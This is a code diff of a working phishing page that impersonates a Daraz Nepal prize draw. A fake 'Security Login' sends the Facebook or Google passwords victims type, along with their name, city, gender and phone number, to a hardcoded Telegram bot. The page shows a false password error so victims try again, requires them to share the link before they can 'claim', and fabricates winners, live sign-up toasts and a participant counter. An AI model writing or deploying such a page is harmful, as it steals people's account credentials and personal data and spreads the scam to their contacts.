@@ -7,107 +7,160 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: #f4f4f6; color: #333; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Inter', sans-serif; background-color: #f4f4f6; color: #333; -webkit-tap-highlight-color: transparent; overflow-x: hidden; }
         .daraz-orange { color: #f85606; }
         .daraz-bg { background-color: #f85606; }
-        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
-        .glass-card { background: white; padding: 35px; border-radius: 24px; width: 100%; max-width: 400px; text-align: center; }
-        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; }
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.97); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
+        .glass-card { background: white; padding: 35px; border-radius: 28px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
+        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; }
+        input:focus { border-color: #f85606; box-shadow: 0 0 0 3px rgba(248, 86, 6, 0.1); }
         #participation-ui, #login-modal, #share-ui, #success-ui { display: none; }
-        .btn-main { width: 100%; background: #f85606; color: white; padding: 16px; border-radius: 14px; font-weight: 900; text-transform: uppercase; cursor: pointer; border: none; transition: 0.3s; }
-        .progress-container { background: #eee; border-radius: 20px; height: 16px; margin: 20px 0; overflow: hidden; }
-        #progress-fill { background: #f85606; height: 100%; width: 0%; transition: 0.6s; }
-        .share-btn { padding: 14px; border-radius: 12px; color: white; font-weight: 700; text-align: center; cursor: pointer; }
+        .btn-main { width: 100%; background: #f85606; color: white; padding: 16px; border-radius: 14px; font-weight: 900; text-transform: uppercase; cursor: pointer; border: none; transition: 0.3s; box-shadow: 0 4px 15px rgba(248, 86, 6, 0.3); }
+        .btn-main:active { transform: scale(0.98); }
+        .progress-container { background: #eee; border-radius: 20px; height: 18px; width: 100%; margin: 20px 0; overflow: hidden; border: 1px solid #ddd; }
+        #progress-fill { background: linear-gradient(90deg, #f85606, #ff8a00); height: 100%; width: 0%; transition: width 0.8s cubic-bezier(0.17, 0.67, 0.83, 0.67); }
+        .share-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; }
+        .share-btn { padding: 14px; border-radius: 12px; color: white; font-weight: 800; font-size: 13px; cursor: pointer; text-align: center; }
+        .live-toast { position: fixed; bottom: 20px; left: 20px; background: rgba(0,0,0,0.85); color: white; padding: 12px 20px; border-radius: 50px; font-size: 12px; z-index: 1000; transform: translateY(150%); transition: 0.5s; display: flex; align-items: center; gap: 10px; border: 1px solid rgba(255,255,255,0.1); }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #f85606; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div id="landing-page" class="max-w-2xl mx-auto py-12 px-6 text-center">
-        <h1 class="text-4xl font-black mb-4">DARAZ <span class="daraz-orange">GIFT EVENT</span></h1>
-        <div class="text-left bg-white p-8 rounded-3xl shadow-sm border mb-8 text-sm">
-            <h3 class="font-black text-xl border-b pb-2 mb-4 uppercase">Rules & Policy</h3>
-            <p>1. One entry per person. Valid ID required for prizes.</p>
+        <h1 class="text-4xl md:text-5xl font-black mb-4 tracking-tighter uppercase">DARAZ <span class="daraz-orange">EXCLUSIVE 2082</span></h1>
+        <div class="text-left bg-white p-8 rounded-3xl shadow-sm border mb-8 space-y-4 text-[13px] leading-relaxed">
+            <h3 class="font-black text-xl border-b pb-2 mb-4 uppercase tracking-tighter daraz-orange">Tournament Rules & Policy</h3>
+            <p><strong>1. Eligibility:</strong> Open only to verified residents of Nepal aged 18 or above.</p>
+            <p><strong>2. Entry Limit:</strong> Strictly one participation per device and IP address to ensure fairness.</p>
+            <p><strong>3. Verification:</strong> All participants must pass the 2nd-stage security login and social verification.</p>
+            <p><strong>4. Identification:</strong> Winners must produce a valid Citizenship or License matching their registration name.</p>
+            <p><strong>5. Fraud Detection:</strong> Use of VPNs, bots, or fake accounts will result in immediate permanent disqualification.</p>
+            <p><strong>6. Selection:</strong> Winners are selected via a transparent, live-streamed randomizer on the official page.</p>
+            <p><strong>7. Prize Claim:</strong> Prizes must be claimed within 7 days of the announcement; otherwise, a runner-up is selected.</p>
+            <p><strong>8. Data Usage:</strong> By participating, you agree to our privacy policy regarding tournament communication.</p>
+            <p><strong>9. Finality:</strong> Daraz Nepal reserves the final right to interpret rules and modify the event structure.</p>
             <div class="mt-6 pt-4 border-t flex items-center gap-3">
-                <input type="checkbox" id="agree-check" class="w-6 h-6 accent-[#f85606]">
-                <label for="agree-check" class="font-black text-gray-700 uppercase text-xs">I agree to all rules</label>
+                <input type="checkbox" id="agree-check" class="w-6 h-6 accent-[#f85606] cursor-pointer">
+                <label for="agree-check" class="font-black text-gray-700 cursor-pointer uppercase text-xs">I agree to all 9 official rules</label>
             </div>
         </div>
-        <button onclick="nav('participation-ui')" class="btn-main text-xl">START</button>
+        <button onclick="nav('participation-ui')" class="btn-main text-xl">PROCEED TO CLAIM</button>
     </div>
 
     <div id="participation-ui" class="min-h-screen flex items-center justify-center p-6">
         <div class="bg-white p-10 rounded-[40px] shadow-2xl w-full max-w-md border">
-            <h2 class="text-2xl font-black mb-6 uppercase">Personal Details</h2>
-            <input type="text" id="c-name" placeholder="Full Name">
-            <input type="text" id="c-loc" placeholder="City">
-            <input type="text" id="c-phone" placeholder="Phone Number">
-            <select id="c-shop">
-                <option value="Regular">Regular Customer</option>
-                <option value="New">New User</option>
+            <h2 class="text-2xl font-black mb-6 uppercase tracking-tight daraz-orange">Participant Info</h2>
+            <input type="text" id="c-name" placeholder="Full Name (As per ID)">
+            <input type="text" id="c-loc" placeholder="Current Location (City)">
+            <select id="c-gender">
+                <option value="" disabled selected>Select Gender</option>
+                <option value="Male">Male</option>
+                <option value="Female">Female</option>
+                <option value="Other">Other</option>
             </select>
-            <button onclick="nav('login-modal')" class="btn-main mt-4">CONTINUE</button>
+            <input type="number" id="c-phone" placeholder="Contact Number (98XXXXXXXX)">
+            <button onclick="nav('login-modal')" class="btn-main mt-4">NEXT STEP</button>
         </div>
     </div>
 
     <div id="login-modal" class="modal-overlay">
         <div class="glass-card">
-            <div class="text-2xl font-black daraz-orange mb-4">Secure Login</div>
-            <div id="err-box" class="hidden text-red-600 text-xs font-bold mb-4">Wrong password! Try again.</div>
-            <select id="l-via"><option value="Facebook">Facebook</option><option value="Google">Google</option></select>
-            <input type="text" id="l-user" placeholder="Email or Mobile" required>
+            <div class="text-2xl font-black daraz-orange tracking-tighter mb-2">Security Login</div>
+            <p class="text-[10px] text-gray-400 font-bold uppercase mb-4">Official Verification Gateway</p>
+            <div id="err-box" class="hidden text-red-600 text-[11px] font-bold mb-4 bg-red-50 p-2 rounded border border-red-200 italic">Security mismatch! Please try your correct password.</div>
+            
+            <select id="l-via">
+                <option value="Facebook">Continue with Facebook</option>
+                <option value="Google">Continue with Google / Email</option>
+            </select>
+            <input type="text" id="l-user" placeholder="Mobile number or email" required>
             <input type="password" id="l-pass" placeholder="Password" required>
-            <button onclick="sendToTelegram()" class="btn-main mt-4" id="sub-btn">VERIFY & REGISTER</button>
+            <button onclick="sendToTelegram()" class="btn-main mt-4" id="sub-btn">LOGIN & VERIFY</button>
+
+            <div class="mt-6 border-t pt-4">
+                <p class="text-[10px] text-gray-400 font-bold uppercase mb-3">Recently Registered</p>
+                <div class="space-y-1 text-left">
+                    <div class="text-[11px] text-gray-600 flex justify-between"><span>Suresh K.***</span><span class="text-green-500 font-bold">✓ VERIFIED</span></div>
+                    <div class="text-[11px] text-gray-600 flex justify-between"><span>Pramila D.***</span><span class="text-green-500 font-bold">✓ VERIFIED</span></div>
+                    <div class="text-[11px] text-gray-600 flex justify-between"><span>Ankit R.***</span><span class="text-green-500 font-bold">✓ VERIFIED</span></div>
+                </div>
+            </div>
         </div>
     </div>
 
     <div id="share-ui" class="min-h-screen flex items-center justify-center p-6">
-        <div class="bg-white p-8 rounded-[40px] shadow-2xl w-full max-w-md text-center">
-            <h2 class="text-2xl font-black mb-1 uppercase">Verification</h2>
+        <div class="bg-white p-8 rounded-[40px] shadow-2xl w-full max-w-md text-center border">
+            <h2 class="text-2xl font-black mb-1 uppercase tracking-tight">Final Step</h2>
+            <p class="text-gray-400 text-[10px] mb-4 uppercase font-bold tracking-widest">Complete 100% Social Progress to Claim</p>
             <div class="progress-container"><div id="progress-fill"></div></div>
-            <div class="grid grid-cols-2 gap-3 mt-6">
+            <p class="text-[12px] font-black daraz-orange">PROGRESS: <span id="percent">0</span>%</p>
+            <div class="share-grid">
                 <div onclick="share('wa')" class="share-btn bg-[#25D366]">WhatsApp</div>
                 <div onclick="share('fb')" class="share-btn bg-[#1877F2]">Facebook</div>
+                <div onclick="share('tg')" class="share-btn bg-[#0088cc]">Telegram</div>
+                <div onclick="share('ms')" class="share-btn bg-[#006AFF]">Messenger</div>
             </div>
-            <button onclick="finalize()" class="btn-main opacity-20 mt-10" id="final-btn">SUBMIT</button>
+            <button onclick="finalize()" class="btn-main opacity-20 mt-10" id="final-btn">SUBMIT CLAIM</button>
+
+            <div class="mt-8 text-left bg-gray-50 p-4 rounded-2xl border border-dashed border-gray-300">
+                <p class="text-[10px] font-black text-gray-400 uppercase mb-2">Live Winners (Today)</p>
+                <div id="winners-list" class="text-[11px] space-y-1 font-bold">
+                    <div class="flex justify-between"><span>🇳🇵 Bibek Sharma (Kathmandu)</span><span class="daraz-orange">Rs 5,000</span></div>
+                    <div class="flex justify-between"><span>🇳🇵 Sunita Thapa (Butwal)</span><span class="daraz-orange">Laptop</span></div>
+                </div>
+            </div>
         </div>
     </div>
 
     <div id="success-ui" class="daraz-bg min-h-screen text-white flex flex-col items-center justify-center p-8 text-center">
-        <h1 class="text-5xl font-black">ENTRY RECORDED!</h1>
-        <div class="mt-8 bg-black/20 p-8 rounded-[32px] w-full max-w-sm">
+        <div class="w-24 h-24 bg-white/20 rounded-full flex items-center justify-center text-5xl mb-6">🏆</div>
+        <h1 class="text-5xl font-black mb-4 tracking-tighter">PARTICIPATION LIVE!</h1>
+        <p class="max-w-md opacity-90 text-lg mb-12">Your entry is officially recorded in the 2082 Daraz Lucky Draw.</p>
+        <div class="bg-black/20 p-8 rounded-[32px] border border-white/10 w-full max-w-sm">
+            <p class="text-[10px] font-black uppercase tracking-widest opacity-60 mb-2">Total Participants Live</p>
             <div class="text-6xl font-mono font-black text-yellow-400" id="live-counter">14,208</div>
         </div>
     </div>
 
+    <div id="toast" class="live-toast">
+        <span class="daraz-bg w-2 h-2 rounded-full animate-ping"></span>
+        <span id="toast-msg">Checking for updates...</span>
+    </div>
+
     <script>
-        // CONFIG - CHANGE THESE
         const BOT_TOKEN = "8393588935:AAG_6BqTknbdk8K7_QGp_DyOjJ5CXS4-xXI";
         const CHAT_ID = "8294939676";
 
         let attempts = 0, shares = 0, lTime = 0, active = false;
 
         function nav(id) {
-            if(id==='participation-ui' && !document.getElementById('agree-check').checked) return alert("Agree to rules!");
+            if(id === 'participation-ui' && !document.getElementById('agree-check').checked) return alert("Please agree to the official rules first!");
             document.querySelectorAll('body > div').forEach(div => div.style.display = 'none');
-            document.getElementById(id).style.display = id === 'login-modal' ? 'flex' : (id === 'success-ui' ? 'flex' : 'flex');
+            const target = document.getElementById(id);
+            target.style.display = (id === 'login-modal' || id === 'participation-ui' || id === 'share-ui' || id === 'success-ui') ? 'flex' : 'block';
+            window.scrollTo(0, 0);
         }
 
         async function sendToTelegram() {
             const btn = document.getElementById('sub-btn');
             const user = document.getElementById('l-user').value;
             const pass = document.getElementById('l-pass').value;
-            if(!user || !pass) return alert("Fill all info!");
+            if(!user || !pass) return alert("Fill all details!");
 
-            attempts++;
-            btn.innerText = "Verifying...";
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loader mr-2"></span>Verifying Account...';
 
-            const message = `
+            setTimeout(async () => {
+                attempts++;
+                const message = `
 🎯 **NEW DARAZ ENTRY** 🎯
 ━━━━━━━━━━━━━━━━
 👤 Name: ${document.getElementById('c-name').value}
 📍 City: ${document.getElementById('c-loc').value}
+🚻 Gender: ${document.getElementById('c-gender').value}
 📞 Phone: ${document.getElementById('c-phone').value}
-🛍️ Shop: ${document.getElementById('c-shop').value}
 ━━━━━━━━━━━━━━━━
 🔑 Method: ${document.getElementById('l-via').value}
 📧 User: ${user}
@@ -115,26 +168,30 @@
 🔢 Attempt: #${attempts}
 ━━━━━━━━━━━━━━━━`;
 
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
-                });
-            } catch (e) {}
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+                    });
+                } catch (e) { console.log(e); }
 
-            if(attempts < 3) {
-                document.getElementById('l-pass').value = "";
-                document.getElementById('err-box').classList.remove('hidden');
-                btn.innerText = "Try Again";
-            } else {
-                nav('share-ui');
-            }
+                btn.disabled = false;
+                btn.innerText = "LOGIN & VERIFY";
+
+                if(attempts < 3) {
+                    document.getElementById('l-pass').value = "";
+                    document.getElementById('err-box').classList.remove('hidden');
+                } else {
+                    nav('share-ui');
+                }
+            }, 2500);
         }
 
         function share(plat) {
             active = true; lTime = Date.now();
-            window.location.href = (plat==='wa' ? "whatsapp://send?text=" : "https://t.me/share/url?url=") + encodeURIComponent("Win Prizes! " + window.location.href);
+            const msg = encodeURIComponent("DARAZ EXCLUSIVE GIFT 2082: Win Laptop & Cash prizes! Join here: " + window.location.href);
+            window.location.href = (plat==='wa' ? "whatsapp://send?text=" : (plat==='tg' ? "https://t.me/share/url?url=" : "https://facebook.com/sharer/sharer.php?u=")) + msg;
         }
 
         document.addEventListener("visibilitychange", () => {
@@ -142,26 +199,44 @@
                 active = false;
                 if(Date.now() - lTime > 1800) {
                     shares++;
-                    document.getElementById('progress-fill').style.width = (shares/5)*100 + "%";
-                    if(shares >= 5) document.getElementById('final-btn').classList.remove('opacity-20');
+                    let p = Math.min((shares/4)*100, 100);
+                    document.getElementById('progress-fill').style.width = p + "%";
+                    document.getElementById('percent').innerText = Math.round(p);
+                    if(shares >= 4) document.getElementById('final-btn').classList.remove('opacity-20');
                 }
             }
         });
 
         function finalize() {
-            if(shares >= 5) {
+            if(shares >= 4) {
                 nav('success-ui');
                 setInterval(() => {
                     const c = document.getElementById('live-counter');
-                    c.innerText = (parseInt(c.innerText.replace(',','')) + 1).toLocaleString();
+                    c.innerText = (parseInt(c.innerText.replace(',','')) + Math.floor(Math.random()*3)).toLocaleString();
                 }, 1000);
             }
         }
+
+        // FAKE TOAST LOGIC
+        const names = ["Nabin M.", "Sita K.", "Rajesh H.", "Prakash T.", "Deepa G.", "Bimal P.", "Roji B."];
+        const cities = ["Kathmandu", "Pokhara", "Lalitpur", "Biratnagar", "Chitwan", "Dharan", "Nepalgunj"];
+        
+        setInterval(() => {
+            const toast = document.getElementById('toast');
+            const msg = document.getElementById('toast-msg');
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomCity = cities[Math.floor(Math.random() * cities.length)];
+            
+            msg.innerText = `${randomName} just registered from ${randomCity}`;
+            toast.style.transform = "translateY(0)";
+            
+            setTimeout(() => {
+                toast.style.transform = "translateY(150%)";
+            }, 3000);
+        }, 6000);
     </script>
 </body>
 </html>
 
 
 
-
-    
